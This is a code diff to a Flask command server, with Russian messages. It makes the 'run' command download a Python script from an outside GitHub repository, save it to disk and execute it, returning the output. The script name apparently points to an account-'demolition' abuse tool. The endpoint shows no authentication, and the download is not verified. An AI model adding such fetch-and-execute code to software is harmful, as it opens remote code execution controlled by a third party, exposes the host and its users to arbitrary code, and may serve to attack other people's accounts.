@@ -1,4 +1,7 @@
+import requests
 from flask import Flask, request, jsonify
+import subprocess
+import sys
 
 app = Flask(__name__)
 
@@ -23,7 +26,20 @@ def command():
     data = request.json
     cmd = data.get('command')
     if cmd == "run":
-        return jsonify({"message": "Команда выполнена"})
+        try:
+            url = "https://raw.githubusercontent.com/fsrqtt/snoselka/refs/heads/main/psychic_snoser.py"
+            r = requests.get(url)
+            if r.status_code != 200:
+                return jsonify({"message": "Не удалось скачать скрипт с GitHub"}), 500
+
+            with open("temp_script.py", "w", encoding="utf-8") as f:
+                f.write(r.text)
+
+            result = subprocess.run([sys.executable, "temp_script.py"], capture_output=True, text=True, timeout=30)
+
+            return jsonify({"message": "Команда выполнена", "output": result.stdout, "error": result.stderr})
+        except Exception as e:
+            return jsonify({"message": f"Ошибка при выполнении команды: {str(e)}"}), 500
     elif cmd == "exit":
         return jsonify({"message": "Завершение соединения"})
     else:
